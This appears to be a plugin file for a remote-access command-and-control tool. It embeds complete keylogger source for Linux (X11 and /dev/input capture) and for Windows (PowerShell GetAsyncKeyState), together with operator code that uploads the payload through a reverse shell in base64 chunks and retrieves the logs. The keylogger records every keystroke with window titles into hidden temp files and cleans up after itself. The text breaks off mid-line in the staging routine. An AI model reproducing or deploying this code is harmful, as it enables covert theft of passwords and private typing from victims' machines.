import base64
import datetime
import json
import os
import re
import secrets
import time
from typing import List

from ..api import plugin, SessionContext


_USAGE = """keylogger — cross-platform keystroke capture with window context.

Usage:
  run keylogger start                  Start capturing keystrokes
  run keylogger status                 Show captured keystrokes and process state
  run keylogger stop [--keep-log]      Stop; deletes log unless --keep-log
  run keylogger fetch <local_path>     Download the log to the operator

Notes:
  - Linux/Unix requires either an X11 session (DISPLAY set, XRECORD
    available) or root / input-group access for /dev/input capture.
  - Windows captures the current user session only; service-session
    capture (session 0) is not possible without elevation.
  - The log rotates with the token; a fresh token is generated each start.
  - Stop is immediate; script and log are removed unless --keep-log.
""".strip()


# ---------------------------------------------------------------------------
# Linux / Unix source
# ---------------------------------------------------------------------------

_LINUX_SOURCE = r'''#!/usr/bin/env python3
import ctypes
import ctypes.util
import fcntl
import glob
import os
import select
import struct
import sys
import threading
import time
from datetime import datetime

LOG_PATH = sys.argv[1] if len(sys.argv) > 1 else '/tmp/.kl.log'
STOP_PATH = sys.argv[2] if len(sys.argv) > 2 else '/tmp/.kl.stop'


def _log(msg):
    try:
        with open(LOG_PATH, 'a', encoding='utf-8', errors='replace') as fh:
            fh.write(msg)
    except Exception:
        pass


def _log_window(text, window):
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    _log(f"\n[{ts}] [Window: {window}]\n{text}")


_SPECIAL = {
    0xFF08: '{BACKSPACE}', 0xFF09: '{TAB}', 0xFF0D: '\n',
    0xFF1B: '{ESC}', 0xFF51: '{LEFT}', 0xFF52: '{UP}',
    0xFF53: '{RIGHT}', 0xFF54: '{DOWN}', 0xFF50: '{HOME}',
    0xFF57: '{END}', 0xFFFF: '{DEL}', 0xFF55: '{PGUP}',
    0xFF56: '{PGDN}', 0xFFBE: '{F1}', 0xFFBF: '{F2}',
    0xFFC0: '{F3}', 0xFFC1: '{F4}', 0xFFC2: '{F5}',
    0xFFC3: '{F6}', 0xFFC4: '{F7}', 0xFFC5: '{F8}',
    0xFFC6: '{F9}', 0xFFC7: '{F10}', 0xFFC8: '{F11}',
    0xFFC9: '{F12}',
}
_SHIFT_L, _SHIFT_R = 0xFFE1, 0xFFE2
_CAPS = 0xFFE5


def _watchdog():
    while True:
        if os.path.exists(STOP_PATH):
            os._exit(0)
        time.sleep(0.5)


# --- X11 XRECORD --------------------------------------------------------

class _XRecordInterceptData(ctypes.Structure):
    _fields_ = [
        ('id_base', ctypes.c_ulong),
        ('server_time', ctypes.c_ulong),
        ('client_seq', ctypes.c_ulong),
        ('category', ctypes.c_int),
        ('client_swapped', ctypes.c_int),
        ('data', ctypes.POINTER(ctypes.c_ubyte)),
        ('data_len', ctypes.c_ulong),
    ]

_CB_TYPE = ctypes.CFUNCTYPE(None, ctypes.c_void_p, ctypes.c_void_p)

_XERR_TYPE = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)


def _install_x_error_handler(libX11):
    try:
        libX11.XSetErrorHandler.restype = ctypes.c_void_p
        libX11.XSetErrorHandler.argtypes = [_XERR_TYPE]

        def _handler(display, event):
            return 0

        _install_x_error_handler._ref = _XERR_TYPE(_handler)
        libX11.XSetErrorHandler(_install_x_error_handler._ref)
    except Exception:
        pass

class X11Keylogger:
    def __init__(self):
        self.shift = False
        self.caps = False
        self.last_window = ''

    def _load_libs(self):
        try:
            self.libX11 = ctypes.CDLL(ctypes.util.find_library('X11') or 'libX11.so.6')
        except OSError:
            return False
        _install_x_error_handler(self.libX11)
        try:
            self.libXtst = ctypes.CDLL(ctypes.util.find_library('Xtst') or 'libXtst.so.6')
        except OSError:
            return False
        return True

    def _get_window_title(self, dpy):
        try:
            focus = ctypes.c_ulong()
            revert = ctypes.c_int()
            self.libX11.XGetInputFocus(dpy, ctypes.byref(focus), ctypes.byref(revert))
            name = ctypes.c_char_p()
            if self.libX11.XFetchName(dpy, focus, ctypes.byref(name)) and name.value:
                title = name.value.decode('utf-8', errors='ignore')[:120]
                if name:
                    self.libX11.XFree(name)
                return title
            if name:
                self.libX11.XFree(name)
        except Exception:
            pass
        return ''

    def _keysym_to_text(self, keysym):
        if keysym == 0 or keysym in (_SHIFT_L, _SHIFT_R, _CAPS):
            return ''
        if 0x20 <= keysym <= 0x7E:
            c = chr(keysym)
            if 0x61 <= keysym <= 0x7A and self.caps:
                return c.upper()
            return c
        return _SPECIAL.get(keysym, '')

    def run(self):
        if not os.environ.get('DISPLAY'):
            return False
        if not self._load_libs():
            return False

        self.libX11.XOpenDisplay.restype = ctypes.c_void_p
        self.libX11.XOpenDisplay.argtypes = [ctypes.c_char_p]
        self.libX11.XCloseDisplay.argtypes = [ctypes.c_void_p]
        self.libX11.XFetchName.restype = ctypes.c_int
        self.libX11.XFetchName.argtypes = [ctypes.c_void_p, ctypes.c_ulong,
                                            ctypes.POINTER(ctypes.c_char_p)]
        self.libX11.XFree.argtypes = [ctypes.c_void_p]
        self.libX11.XGetInputFocus.argtypes = [ctypes.c_void_p,
                                                ctypes.POINTER(ctypes.c_ulong),
                                                ctypes.POINTER(ctypes.c_int)]
        self.libX11.XKeycodeToKeysym.restype = ctypes.c_ulong
        self.libX11.XKeycodeToKeysym.argtypes = [ctypes.c_void_p, ctypes.c_ubyte, ctypes.c_int]

        self.libXtst.XRecordAllocRange.restype = ctypes.c_void_p
        self.libXtst.XRecordCreateContext.restype = ctypes.c_ulong
        self.libXtst.XRecordCreateContext.argtypes = [
            ctypes.c_void_p, ctypes.c_int,
            ctypes.POINTER(ctypes.c_ulong), ctypes.c_int,
            ctypes.POINTER(ctypes.c_void_p), ctypes.c_int
        ]
        self.libXtst.XRecordEnableContext.argtypes = [
            ctypes.c_void_p, ctypes.c_ulong, _CB_TYPE, ctypes.c_void_p
        ]
        self.libXtst.XRecordFreeContext.argtypes = [ctypes.c_void_p, ctypes.c_ulong]

        dpy = self.libX11.XOpenDisplay(None)
        if not dpy:
            return False

        range_ptr = self.libXtst.XRecordAllocRange()
        if not range_ptr:
            self.libX11.XCloseDisplay(dpy)
            return False

        ctypes.memset(range_ptr + 12, 2, 1)
        ctypes.memset(range_ptr + 13, 3, 1)

        clients = (ctypes.c_ulong * 1)(0)
        ranges = (ctypes.c_void_p * 1)(range_ptr)
        ctx = self.libXtst.XRecordCreateContext(dpy, 0, clients, 1, ranges, 1)
        if not ctx:
            self.libX11.XCloseDisplay(dpy)
            return False

        logger = self

        def _callback(closure, data_ptr):
            try:
                if not data_ptr:
                    return
                d = ctypes.cast(data_ptr, ctypes.POINTER(_XRecordInterceptData)).contents
                if d.category != 0 or d.data_len < 32:
                    return
                ev_type = d.data[0] & 0x7F
                if ev_type not in (2, 3):
                    return
                keycode = d.data[1]

                shift_ks = logger.libX11.XKeycodeToKeysym(dpy, keycode, 0)
                if ev_type == 3:
                    if shift_ks in (_SHIFT_L, _SHIFT_R):
                        logger.shift = False
                    return
                if shift_ks in (_SHIFT_L, _SHIFT_R):
                    logger.shift = True
                    return
                if shift_ks == _CAPS:
                    logger.caps = not logger.caps
                    return

                keysym = logger.libX11.XKeycodeToKeysym(dpy, keycode, 1 if logger.shift else 0)
                if keysym == 0:
                    keysym = shift_ks
                text = logger._keysym_to_text(keysym)
                if not text:
                    return

                title = logger._get_window_title(dpy)
                if title and title != logger.last_window:
                    logger.last_window = title
                    _log_window(text, title)
                else:
                    _log(text)
            except Exception:
                pass

        cb = _CB_TYPE(_callback)
        start = time.time()
        try:
            self.libXtst.XRecordEnableContext(dpy, ctx, cb, None)
        except Exception:
            pass
        finally:
            try:
                self.libXtst.XRecordFreeContext(dpy, ctx)
            except Exception:
                pass
            try:
                self.libX11.XCloseDisplay(dpy)
            except Exception:
                pass

        return (time.time() - start) >= 1.0


# --- X11 XQueryKeymap polling -------------------------------------------

class X11PollKeylogger:

    def __init__(self):
        self.shift = False
        self.caps = False
        self.last_window = ''
        self.prev_state = [False] * 256

    def _load_libs(self):
        try:
            self.libX11 = ctypes.CDLL(ctypes.util.find_library('X11') or 'libX11.so.6')
        except OSError:
            return False
        _install_x_error_handler(self.libX11)
        return True

    def _get_window_title(self, dpy):
        try:
            focus = ctypes.c_ulong()
            revert = ctypes.c_int()
            self.libX11.XGetInputFocus(dpy, ctypes.byref(focus), ctypes.byref(revert))
            name = ctypes.c_char_p()
            if self.libX11.XFetchName(dpy, focus, ctypes.byref(name)) and name.value:
                title = name.value.decode('utf-8', errors='ignore')[:120]
                if name:
                    self.libX11.XFree(name)
                return title
            if name:
                self.libX11.XFree(name)
        except Exception:
            pass
        return ''

    def _keysym_to_text(self, keysym):
        if keysym == 0 or keysym in (_SHIFT_L, _SHIFT_R, _CAPS):
            return ''
        if 0x20 <= keysym <= 0x7E:
            c = chr(keysym)
            if 0x61 <= keysym <= 0x7A and self.caps:
                return c.upper()
            return c
        return _SPECIAL.get(keysym, '')

    def run(self):
        if not os.environ.get('DISPLAY'):
            return False
        if not self._load_libs():
            return False

        self.libX11.XOpenDisplay.restype = ctypes.c_void_p
        self.libX11.XOpenDisplay.argtypes = [ctypes.c_char_p]
        self.libX11.XCloseDisplay.argtypes = [ctypes.c_void_p]
        self.libX11.XFetchName.restype = ctypes.c_int
        self.libX11.XFetchName.argtypes = [ctypes.c_void_p, ctypes.c_ulong,
                                            ctypes.POINTER(ctypes.c_char_p)]
        self.libX11.XFree.argtypes = [ctypes.c_void_p]
        self.libX11.XGetInputFocus.argtypes = [ctypes.c_void_p,
                                                ctypes.POINTER(ctypes.c_ulong),
                                                ctypes.POINTER(ctypes.c_int)]
        self.libX11.XQueryKeymap.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
        self.libX11.XKeycodeToKeysym.restype = ctypes.c_ulong
        self.libX11.XKeycodeToKeysym.argtypes = [ctypes.c_void_p, ctypes.c_ubyte, ctypes.c_int]

        dpy = self.libX11.XOpenDisplay(None)
        if not dpy:
            return False

        buf = ctypes.create_string_buffer(32)
        try:
            self.libX11.XQueryKeymap(dpy, buf)
        except Exception:
            self.libX11.XCloseDisplay(dpy)
            return False

        iter_count = 0
        try:
            while True:
                iter_count += 1
                if iter_count % 20 == 0:
                    if os.path.exists(STOP_PATH):
                        return True

                try:
                    self.libX11.XQueryKeymap(dpy, buf)
                except Exception:
                    break

                raw = buf.raw
                for keycode in range(8, 256):
                    byte_idx = keycode // 8
                    bit_idx = keycode % 8
                    is_down = bool(raw[byte_idx] & (1 << bit_idx))
                    if is_down and not self.prev_state[keycode]:
                        shift_ks = self.libX11.XKeycodeToKeysym(dpy, keycode, 0)
                        if shift_ks in (_SHIFT_L, _SHIFT_R):
                            self.shift = True
                        elif shift_ks == _CAPS:
                            self.caps = not self.caps
                        else:
                            keysym = self.libX11.XKeycodeToKeysym(
                                dpy, keycode, 1 if self.shift else 0)
                            if keysym == 0:
                                keysym = shift_ks
                            text = self._keysym_to_text(keysym)
                            if text:
                                title = self._get_window_title(dpy)
                                if title and title != self.last_window:
                                    self.last_window = title
                                    _log_window(text, title)
                                else:
                                    _log(text)
                    elif not is_down and self.prev_state[keycode]:
                        shift_ks = self.libX11.XKeycodeToKeysym(dpy, keycode, 0)
                        if shift_ks in (_SHIFT_L, _SHIFT_R):
                            self.shift = False
                    self.prev_state[keycode] = is_down

                time.sleep(0.010)
        finally:
            try:
                self.libX11.XCloseDisplay(dpy)
            except Exception:
                pass
        return True


# --- /dev/input reader --------------------------------------------------

_KEYCODES = {
    2: '1', 3: '2', 4: '3', 5: '4', 6: '5', 7: '6', 8: '7', 9: '8', 10: '9', 11: '0',
    12: '-', 13: '=', 14: '{BACKSPACE}', 15: '{TAB}', 16: 'q', 17: 'w', 18: 'e',
    19: 'r', 20: 't', 21: 'y', 22: 'u', 23: 'i', 24: 'o', 25: 'p', 26: '[', 27: ']',
    28: '\n', 29: '{CTRL}', 30: 'a', 31: 's', 32: 'd', 33: 'f', 34: 'g', 35: 'h',
    36: 'j', 37: 'k', 38: 'l', 39: ';', 40: "'", 41: '`', 42: '{SHIFT}', 43: '\\',
    44: 'z', 45: 'x', 46: 'c', 47: 'v', 48: 'b', 49: 'n', 50: 'm', 51: ',', 52: '.',
    53: '/', 54: '{SHIFT}', 55: '*', 56: '{ALT}', 57: ' ', 58: '{CAPS}',
    59: '{F1}', 60: '{F2}', 61: '{F3}', 62: '{F4}', 63: '{F5}', 64: '{F6}',
    65: '{F7}', 66: '{F8}', 67: '{F9}', 68: '{F10}', 87: '{F11}', 88: '{F12}',
    96: '{ENTER}', 97: '{CTRL}', 98: '/', 99: '{PRTSCR}', 100: '{ALT}',
    102: '{HOME}', 103: '{UP}', 104: '{PGUP}', 105: '{LEFT}', 106: '{RIGHT}',
    107: '{END}', 108: '{DOWN}', 109: '{PGDN}', 110: '{INS}', 111: '{DEL}',
    125: '{META}', 126: '{META}',
}
_SHIFTED = {
    '1': '!', '2': '@', '3': '#', '4': '$', '5': '%', '6': '^',
    '7': '&', '8': '*', '9': '(', '0': ')',
    '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|', ';': ':',
    "'": '"', '`': '~', ',': '<', '.': '>', '/': '?',
}


def _eviocgbit(ev, length):
    return (2 << 30) | (ord('E') << 8) | (0x20 + ev) | (length << 16)


def _device_name(fd):
    EVIOCGNAME = (2 << 30) | (ord('E') << 8) | 0x06 | (256 << 16)
    try:
        buf = fcntl.ioctl(fd, EVIOCGNAME, b'\x00' * 256)
        return buf.rstrip(b'\x00').decode('utf-8', errors='ignore')
    except Exception:
        return ''


def _is_keyboard(fd):
    try:
        buf = fcntl.ioctl(fd, _eviocgbit(1, 96), b'\x00' * 96)
    except Exception:
        return False
    for code in (28, 30, 44):
        if not (buf[code // 8] & (1 << (code % 8))):
            return False
    return True


def _input_fallback():
    EVENT_SIZE = struct.calcsize('llHHi')
    devices = []
    for path in sorted(glob.glob('/dev/input/event*')):
        try:
            fd = os.open(path, os.O_RDONLY | os.O_NONBLOCK)
        except (PermissionError, OSError):
            continue
        if not _is_keyboard(fd):
            try:
                os.close(fd)
            except Exception:
                pass
            continue
        name = _device_name(fd)
        _log(f"[stage] keyboard device: {path} ({name})\n")
        devices.append(fd)

    if not devices:
        return False

    shift = False
    caps = False
    last_check = time.time()
    last_seen = {}

    try:
        while True:
            if time.time() - last_check > 0.5:
                if os.path.exists(STOP_PATH):
                    return True
                last_check = time.time()

            try:
                ready, _, _ = select.select(devices, [], [], 0.1)
            except (OSError, ValueError):
                return False

            for fd in ready:
                try:
                    data = os.read(fd, EVENT_SIZE * 64)
                except (BlockingIOError, OSError):
                    continue
                if not data:
                    continue
                for off in range(0, len(data) - EVENT_SIZE + 1, EVENT_SIZE):
                    try:
                        tv_sec, tv_usec, ev_type, code, value = struct.unpack(
                            'llHHi', data[off:off + EVENT_SIZE])
                    except Exception:
                        continue
                    if ev_type != 1:
                        continue

                    kernel_us = tv_sec * 1000000 + tv_usec
                    dedup_key = (code, value)
                    prev = last_seen.get(dedup_key, 0)
                    if kernel_us - prev < 5000:
                        continue
                    last_seen[dedup_key] = kernel_us

                    if value == 0:
                        if code in (42, 54):
                            shift = False
                        continue
                    if value == 2:
                        pass
                    ch = _KEYCODES.get(code, '')
                    if code in (42, 54):
                        shift = True
                        continue
                    if code == 58:
                        caps = not caps
                        continue
                    if ch.startswith('{') and ch.endswith('}'):
                        if ch not in ('{SHIFT}', '{CTRL}', '{ALT}', '{CAPS}', '{META}'):
                            _log(ch)
                        continue
                    if shift and ch in _SHIFTED:
                        ch = _SHIFTED[ch]
                    elif ch.isalpha():
                        ch = ch.upper() if (shift ^ caps) else ch.lower()
                    _log(ch)
    finally:
        for fd in devices:
            try:
                os.close(fd)
            except Exception:
                pass
    return True


# --- main ---------------------------------------------------------------

def _detect_display():
    if os.environ.get('DISPLAY'):
        return 'x11'
    if os.environ.get('WAYLAND_DISPLAY'):
        return 'wayland'
    return 'tty'


def _find_x11_sockets():
    candidates = []
    for pattern in ('/tmp/.X11-unix/X*', '/run/user/*/.X11-unix/X*'):
        for sock in sorted(glob.glob(pattern)):
            try:
                n = os.path.basename(sock).lstrip('X')
                if n.isdigit():
                    candidates.append(f":{n}")
            except Exception:
                continue
    return candidates


def _try_x11_display(display_str):
    try:
        lib = ctypes.CDLL(ctypes.util.find_library('X11') or 'libX11.so.6')
    except OSError:
        return False
    try:
        lib.XOpenDisplay.restype = ctypes.c_void_p
        lib.XOpenDisplay.argtypes = [ctypes.c_char_p]
        lib.XCloseDisplay.argtypes = [ctypes.c_void_p]
        dpy = lib.XOpenDisplay(display_str.encode())
        if dpy:
            lib.XCloseDisplay(dpy)
            return True
    except Exception:
        pass
    return False


def _find_display_from_procs():
    my_uid = os.getuid()
    for pid_dir in glob.glob('/proc/[0-9]*'):
        try:
            pid = int(os.path.basename(pid_dir))
        except ValueError:
            continue
        if pid == os.getpid():
            continue
        try:
            if os.stat(pid_dir).st_uid != my_uid:
                continue
            with open(os.path.join(pid_dir, 'environ'), 'rb') as fh:
                env = fh.read()
        except (OSError, PermissionError):
            continue
        for entry in env.split(b'\x00'):
            if entry.startswith(b'DISPLAY='):
                val = entry[len(b'DISPLAY='):].decode('utf-8', errors='ignore')
                if val and _try_x11_display(val):
                    return val
            if entry.startswith(b'WAYLAND_DISPLAY='):
                val = entry[len(b'WAYLAND_DISPLAY='):].decode('utf-8', errors='ignore')
                if val and not os.environ.get('WAYLAND_DISPLAY'):
                    os.environ['WAYLAND_DISPLAY'] = val
    return None


def _input_access_report():
    try:
        import grp
        import pwd
    except Exception:
        return "unknown"

    try:
        user = pwd.getpwuid(os.getuid())
    except Exception:
        user = None

    try:
        input_gid = grp.getgrnam('input').gr_gid
    except KeyError:
        input_gid = None

    in_input_group = False
    try:
        if input_gid is not None:
            in_input_group = input_gid in os.getgroups()
    except Exception:
        pass

    events = glob.glob('/dev/input/event*')
    if not events:
        return "no /dev/input/event* devices on this system"

    readable = 0
    unreadable = 0
    for path in events:
        try:
            fd = os.open(path, os.O_RDONLY | os.O_NONBLOCK)
            os.close(fd)
            readable += 1
        except (PermissionError, OSError):
            unreadable += 1

    parts = [f"{len(events)} event device(s) found"]
    if readable:
        parts.append(f"{readable} readable")
    if unreadable:
        parts.append(f"{unreadable} permission denied")

    if user and input_gid is not None:
        if in_input_group:
            parts.append("user is in 'input' group")
        else:
            parts.append(
                f"user '{user.pw_name}' not in 'input' group "
                f"(add with: sudo usermod -aG input {user.pw_name})"
            )

    return "; ".join(parts)


def _try_x11_methods():
    _log("[stage] trying X11 XRECORD\n")
    try:
        x = X11Keylogger()
        if x.run():
            _log("[stage] X11 XRECORD active\n")
            return True
        _log("[stage] X11 XRECORD unavailable\n")
    except Exception as e:
        _log(f"[stage] X11 XRECORD error: {e}\n")

    _log("[stage] trying X11 XQueryKeymap (lossy fallback)\n")
    try:
        p = X11PollKeylogger()
        if p.run():
            _log("[stage] X11 XQueryKeymap active (keys may be lost)\n")
            return True
        _log("[stage] X11 XQueryKeymap unavailable\n")
    except Exception as e:
        _log(f"[stage] X11 XQueryKeymap error: {e}\n")
    return False

def _dev_input_probe():
    accessible = []
    for path in sorted(glob.glob('/dev/input/event*')):
        try:
            fd = os.open(path, os.O_RDONLY | os.O_NONBLOCK)
        except (PermissionError, OSError):
            continue
        try:
            if _is_keyboard(fd):
                accessible.append(path)
        finally:
            try:
                os.close(fd)
            except Exception:
                pass
    return accessible


def main():
    threading.Thread(target=_watchdog, daemon=True).start()

    _log(f"\n--- keylogger session started {datetime.now().isoformat()} "
         f"pid={os.getpid()} ---\n")

    _log("[stage] probing /dev/input\n")
    accessible = _dev_input_probe()
    if accessible:
        _log(f"[stage] /dev/input has {len(accessible)} accessible keyboard device(s)\n")
        try:
            if _input_fallback():
                _log("[stage] /dev/input active\n")
                return
        except Exception as e:
            _log(f"[stage] /dev/input error: {e}\n")
    else:
        _log("[stage] /dev/input not accessible\n")

    _log("[stage] falling back to X11\n")

    if os.environ.get('DISPLAY'):
        _log(f"[stage] DISPLAY={os.environ['DISPLAY']} from environment\n")
        if _try_x11_methods():
            return

    _log("[stage] searching for X11 sockets\n")
    for candidate in _find_x11_sockets():
        if _try_x11_display(candidate):
            _log(f"[stage] found working X11 display {candidate}\n")
            os.environ['DISPLAY'] = candidate
            if _try_x11_methods():
                return
            break

    _log("[stage] checking /proc/*/environ for DISPLAY\n")
    found = _find_display_from_procs()
    if found:
        _log(f"[stage] discovered DISPLAY={found} from process environ\n")
        os.environ['DISPLAY'] = found
        if _try_x11_methods():
            return

    report = _input_access_report()
    _log(f"[stage] /dev/input diagnostic: {report}\n")
    _log("[keylogger] No capture method available.\n")
    _log("[keylogger] Diagnosis and next steps:\n")
    _log("[keylogger]   /dev/input access is required for reliable capture.\n")
    _log("[keylogger]   Add the user to the input group:\n")
    _log("[keylogger]       sudo usermod -aG input <user>\n")
    _log("[keylogger]   The user must log out and back in for the group to "
         "take effect. Running the session as root also enables /dev/input.\n")
    _log("[keylogger]   X11 polling was attempted but cannot capture fast "
         "keystrokes reliably.\n")


if __name__ == '__main__':
    main()
'''


# ---------------------------------------------------------------------------
# Windows source — PowerShell GetAsyncKeyState
# ---------------------------------------------------------------------------

_WINDOWS_SOURCE = r'''
param([string]$Token)

$ErrorActionPreference = 'SilentlyContinue'

$LogPath = Join-Path $env:TEMP "$Token.dat"
$StopPath = Join-Path $env:TEMP "$Token.stop"

Remove-Item $StopPath -Force -EA 0

try {
    Add-Content -Path $LogPath -Value ("`n--- keylogger session started " + (Get-Date).ToString('yyyy-MM-dd HH:mm:ss') + " ---`n") -EA 0
} catch {}

Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class KB {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll", CharSet=CharSet.Unicode)] public static extern int GetWindowTextW(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
    [DllImport("user32.dll")] public static extern int GetWindowTextLengthW(IntPtr hWnd);
}
"@

function Get-WindowTitle {
    try {
        $hwnd = [KB]::GetForegroundWindow()
        if ($hwnd -eq [IntPtr]::Zero) { return '' }
        $len = [KB]::GetWindowTextLengthW($hwnd)
        if ($len -le 0) { return '' }
        $sb = New-Object System.Text.StringBuilder ($len + 1)
        [void][KB]::GetWindowTextW($hwnd, $sb, $sb.Capacity)
        return $sb.ToString()
    } catch { return '' }
}

function Convert-Key {
    param([int]$vk, [bool]$shift, [bool]$caps)
    if ($vk -ge 65 -and $vk -le 90) {
        $c = [char]$vk
        if ($shift -xor $caps) { return $c.ToString().ToUpper() }
        return $c.ToString().ToLower()
    }
    if ($vk -ge 48 -and $vk -le 57) {
        $plain = '0123456789'
        $shifted = ')!@#$%^&*('
        if ($shift) { return $shifted[$vk - 48].ToString() }
        return $plain[$vk - 48].ToString()
    }
    switch ($vk) {
        8  { return '{BACKSPACE}' }
        9  { return '{TAB}' }
        13 { return "`r`n" }
        27 { return '{ESC}' }
        32 { return ' ' }
        33 { return '{PGUP}' } 34 { return '{PGDN}' }
        35 { return '{END}' }  36 { return '{HOME}' }
        37 { return '{LEFT}' } 38 { return '{UP}' }
        39 { return '{RIGHT}' } 40 { return '{DOWN}' }
        45 { return '{INS}' }  46 { return '{DEL}' }
    }
    $punct = @{
        186 = @(';', ':'); 187 = @('=', '+'); 188 = @(',', '<')
        189 = @('-', '_'); 190 = @('.', '>'); 191 = @('/', '?')
        192 = @('`', '~'); 219 = @('[', '{'); 220 = @('\', '|')
        221 = @(']', '}'); 222 = @("'", '"')
    }
    if ($punct.ContainsKey($vk)) {
        if ($shift) { return $punct[$vk][1] }
        return $punct[$vk][0]
    }
    return ''
}

$sb = New-Object System.Text.StringBuilder
$lastWindow = ''
$lastFlush = Get-Date
$capsState = $false

$w0 = Get-WindowTitle
if ($w0) {
    $lastWindow = $w0
    [void]$sb.AppendLine("`r`n[" + (Get-Date).ToString('yyyy-MM-dd HH:mm:ss') + "] [Window: $w0]")
}

while ($true) {
    if (Test-Path $StopPath) { break }

    $shiftDown = ([KB]::GetAsyncKeyState(0x10) -band 0x8000) -ne 0

    if (([KB]::GetAsyncKeyState(0x14) -band 0x0001) -ne 0) {
        $capsState = -not $capsState
    }

    for ($vk = 8; $vk -le 254; $vk++) {
        if ($vk -eq 0x10 -or $vk -eq 0x14) { continue } 
        $state = [KB]::GetAsyncKeyState($vk)
        if (($state -band 0x0001) -ne 0) {
            $w = Get-WindowTitle
            if ($w -and $w -ne $lastWindow) {
                [void]$sb.AppendLine("`r`n[" + (Get-Date).ToString('yyyy-MM-dd HH:mm:ss') + "] [Window: $w]")
                $lastWindow = $w
            }
            $char = Convert-Key -vk $vk -shift $shiftDown -caps $capsState
            if ($char) { [void]$sb.Append($char) }
        }
    }

    $elapsed = (Get-Date) - $lastFlush
    if ($sb.Length -ge 200 -or $elapsed.TotalSeconds -ge 2) {
        if ($sb.Length -gt 0) {
            try {
                Add-Content -Path $LogPath -Value $sb.ToString() -NoNewline -EA 0
                [void]$sb.Clear()
            } catch {}
        }
        $lastFlush = Get-Date
    }

    Start-Sleep -Milliseconds 15
}
'''


# ---------------------------------------------------------------------------
# Operator-side state
# ---------------------------------------------------------------------------

def _state_path(session: SessionContext) -> str:
    try:
        logger = getattr(session, 'logger', None)
        if logger and getattr(logger, 'session_dir', None):
            return os.path.join(logger.session_dir, 'keylogger_state.json')
    except Exception:
        pass
    base = os.path.join(os.getcwd(), 'logs', '_keylogger')
    os.makedirs(base, exist_ok=True)
    return os.path.join(base, f"session_{session.session_id}.json")


def _load_state(session: SessionContext) -> dict:
    path = _state_path(session)
    if not os.path.isfile(path):
        return {}
    try:
        with open(path, 'r', encoding='utf-8') as fh:
            data = json.load(fh)
            return data if isinstance(data, dict) else {}
    except Exception:
        return {}


def _save_state(session: SessionContext, state: dict) -> None:
    try:
        with open(_state_path(session), 'w', encoding='utf-8') as fh:
            json.dump(state, fh, indent=2)
    except Exception:
        pass


def _clear_state(session: SessionContext) -> None:
    try:
        p = _state_path(session)
        if os.path.isfile(p):
            os.remove(p)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Low-level execution helpers
# ---------------------------------------------------------------------------

def _run_ps(session: SessionContext, ps: str, timeout: float = 30.0) -> str:
    handler = session._handler
    sock = session._client_sock
    try:
        if not handler._send_win_ps(sock, ps):
            return ''
    except Exception:
        return ''
    return handler.recv_output(sock, timeout=timeout) or ''


def _run_shell(session: SessionContext, cmd: str, timeout: float = 15.0) -> str:
    handler = session._handler
    sock = session._client_sock
    try:
        if not handler.send_to_revshell(sock, cmd):
            return ''
    except Exception:
        return ''
    return handler.recv_output(sock, timeout=timeout) or ''


def _parse_int(text: str) -> int:
    if not text:
        return 0
    for line in reversed(text.splitlines()):
        line = line.strip()
        if line.isdigit():
            return int(line)
    return 0


def _decode_b64(raw: str) -> str:
    if not raw:
        return ''
    candidates = re.findall(r'[A-Za-z0-9+/=]{32,}', raw)
    if not candidates:
        return ''
    b64 = max(candidates, key=len)
    b64 = b64.rstrip('=')
    b64 += '=' * ((-len(b64)) % 4)
    try:
        return base64.b64decode(b64).decode('utf-8', errors='replace')
    except Exception:
        return ''


def _resolve_windows_temp(session: SessionContext) -> str:
    from ...constants import XFER_MARK_START, XFER_MARK_END
    probe = (
        f"Write-Output ('{XFER_MARK_START}' + "
        f"[IO.Path]::GetFullPath($env:TEMP) + '{XFER_MARK_END}')"
    )
    out = _run_ps(session, probe, timeout=8.0)
    if not out:
        return ''
    start = out.find(XFER_MARK_START)
    if start < 0:
        return ''
    start += len(XFER_MARK_START)
    end = out.find(XFER_MARK_END, start)
    if end < 0:
        return ''
    return out[start:end].strip()


# ---------------------------------------------------------------------------
# Line-based staging (single definition)
# ---------------------------------------------------------------------------

def _stage_via_lines(session: SessionContext, remote_path: str,
                     content_bytes: bytes, is_windows: bool) -> bool:
    handler = session._handler
    sock = session._client_sock

    b64_data = base64.b64encode(content_bytes).decode('ascii')
    b64_path = remote_path + '.b64'
    LINE = 384

    if is_windows:
        reset = (
            f"Remove-Item -LiteralPath '{b64_path}' -Force -EA 0; "
            f"New-Item -ItemType File -Path '{b64_path}' -Force | Out-Null; "
            f"Write-Output 'RESET_OK'"
        )
        _run_ps(session, reset, timeout=10.0)
    else:
        handler.send_to_revshell(sock, f": > '{b64_path}' && echo RESET_OK")
        handler.recv_output(sock, timeout=5.0)

    if is_windows:
        BATCH = 6
        lines = [b64_data[i:i + LINE] for i in range(0, len(b64_data), LINE)]
        for i in range(0, len(lines), BATCH):
            group = lines[i:i + BATCH]
            script = '; '.join(
                f"Add-Content -LiteralPath '{b64_path}' -Value '{c}' -EA 0"
                for c in group
            )
            _run_ps(session, script, timeout=20.0)
    else:
        for i in range(0, len(b64_data), LINE):
            chunk = b64_data[i:i + LINE]
            handler.send_to_revshell(sock, f"echo '{chunk}' >> '{b64_path}'")
        handler.recv_output(sock, timeout=15.0)

    if is_windows:
        decode = (
            f"$raw = Get-Content -Raw -LiteralPath '{b64_path}' -EA 0; "
            f"if (-not $raw) {{ Write-Output 'DECODE_FAIL:empty' }} else {{ "
            f"  $clean = $raw -replace '\\s', ''; "
            f"  try {{ "
            f"    $bytes = [Convert]::FromBase64String($clean); "
            f"    [IO.File]::WriteAllBytes('{remote_path}', $bytes); "
            f"    Remove-Item -LiteralPath '{b64_path}' -Force -EA 0; "
            f"    Write-Output 'DECODE_OK' "
            f"  }} catch {{ Write-Output ('DECODE_FAIL:' + $_.Exception.Message) }} "
            f"}}"
        )
        out = _run_ps(session, decode, timeout=30.0)
    else:
        decode = (
            f"if base64 -d '{b64_path}' > '{remote_path}' 2>/dev/null; then "
            f"rm -f '{b64_path}'; echo DECODE_OK; "
            f"elif python3 -c 'import base64,sys;"
